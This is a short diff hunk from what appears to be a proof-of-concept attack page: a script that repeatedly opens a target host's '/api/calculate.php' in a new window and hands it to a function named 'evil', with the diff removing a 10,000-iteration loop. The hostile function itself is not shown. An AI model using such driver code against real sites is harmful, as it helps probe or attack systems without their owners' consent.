@@ -21,7 +21,6 @@
     }
 
     async function modifyLocationHash() {
-      for(let j=0;j<10000;j++){
       // Open the website
       var url = "http://"+host+"/api/calculate.php"
       var win = window.open(url);
@@ -35,7 +34,6 @@
         evil(win);
         await sleep(2);
       }
-        }
     }
     
   </script>
